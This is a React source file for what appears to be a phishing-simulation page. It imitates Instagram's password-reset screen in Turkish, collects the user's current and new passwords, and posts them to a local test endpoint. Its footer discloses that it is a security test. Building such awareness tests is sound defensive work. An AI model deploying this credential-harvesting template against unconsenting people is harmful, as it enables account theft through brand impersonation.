import { useState, useEffect } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import './PhishingTest.css'
function PhishingTest() {
  const { id } = useParams()
  const navigate = useNavigate()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [step, setStep] = useState(1)
  const [loading, setLoading] = useState(false)
  const [testInfo, setTestInfo] = useState(null)
  useEffect(() => {
    if (id) {
      fetch(`/api/v1/phishing/test/${id}`)
        .then(res => res.json())
        .then(data => {
          if (data.ok && data.test) {
            setTestInfo(data.test)
            setEmail(data.test.email)
          }
        })
        .catch(() => {})
    }
  }, [id])
  const handleSubmit = async (e) => {
    e.preventDefault()
    setLoading(true)
    try {
      const res = await fetch(`/api/v1/phishing/test/${id}/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password, newPassword, confirmPassword })
      })
      const data = await res.json()
      if (data.ok) {
        setTimeout(() => navigate('/phishing/success'), 1000)
      }
    } catch (err) {
    } finally {
      setLoading(false)
    }
  }
  return (
    <div className="phishing-container">
      <div className="phishing-header">
        <div className="instagram-logo">
          <svg width="103" height="29" viewBox="0 0 103 29" fill="none">
            <path d="M63.394 16.488c0 1.98-1.608 3.588-3.588 3.588s-3.588-1.608-3.588-3.588 1.608-3.588 3.588-3.588 3.588 1.608 3.588 3.588zm5.76 0c0-5.16-4.188-9.348-9.348-9.348s-9.348 4.188-9.348 9.348 4.188 9.348 9.348 9.348 9.348-4.188 9.348-9.348zm9.348 0c0 8.184-6.636 14.82-14.82 14.82-8.184 0-14.82-6.636-14.82-14.82S45.498 1.668 53.682 1.668c8.184 0 14.82 6.636 14.82 14.82z" fill="#262626"/>
            <path d="M78.182 16.488c0-1.98 1.608-3.588 3.588-3.588s3.588 1.608 3.588 3.588-1.608 3.588-3.588 3.588-3.588-1.608-3.588-3.588z" fill="#262626"/>
            <path d="M85.358 16.488c0-5.16 4.188-9.348 9.348-9.348s9.348 4.188 9.348 9.348-4.188 9.348-9.348 9.348-9.348-4.188-9.348-9.348z" fill="#262626"/>
          </svg>
        </div>
      </div>
      <div className="phishing-content">
        {step === 1 ? (
          <div className="phishing-step">
            <h2>Şifrenizi mi unuttunuz?</h2>
            <p>Hesabınıza giriş yapmak için kullandığınız kullanıcı adı veya e‑posta adresinizi girin. Size bir bağlantı göndereceğiz.</p>
            <form onSubmit={(e) => { e.preventDefault(); setStep(2); }}>
              <div className="form-group">
                <input type="text" placeholder="Kullanıcı adı veya e‑posta" value={email} onChange={(e) => setEmail(e.target.value)} required className="phishing-input" />
              </div>
              <button type="submit" className="phishing-btn-primary">Giriş Bağlantısı Gönder</button>
            </form>
            <div className="phishing-divider">
              <span>veya</span>
            </div>
            <button className="phishing-btn-secondary" onClick={() => setStep(2)}>Telefon numarasıyla devam et</button>
          </div>
        ) : step === 2 ? (
          <div className="phishing-step">
            <h2>Yeni şifre oluştur</h2>
            <p>Güvenliğiniz için yeni bir şifre oluşturun.</p>
            <form onSubmit={handleSubmit}>
              <div className="form-group">
                <input type="password" placeholder="Mevcut şifre" value={password} onChange={(e) => setPassword(e.target.value)} required className="phishing-input" />
              </div>
              <div className="form-group">
                <input type="password" placeholder="Yeni şifre" value={newPassword} onChange={(e) => setNewPassword(e.target.value)} required className="phishing-input" minLength="6" />
              </div>
              <div className="form-group">
                <input type="password" placeholder="Yeni şifreyi onayla" value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} required className="phishing-input" minLength="6" />
              </div>
              {newPassword && confirmPassword && newPassword !== confirmPassword && (
                <p className="error-text">Şifreler eşleşmiyor</p>
              )}
              <button type="submit" className="phishing-btn-primary" disabled={loading || (newPassword && confirmPassword && newPassword !== confirmPassword)}>
                {loading ? 'İşleniyor...' : 'Şifreyi Değiştir'}
              </button>
            </form>
            <button className="phishing-link" onClick={() => setStep(1)}>Geri dön</button>
          </div>
        ) : null}
      </div>
      <div className="phishing-footer">
        <p>Bu bir güvenlik testidir. Gerçek Instagram sayfası değildir.</p>
      </div>
    </div>
  )
}
export default PhishingTest
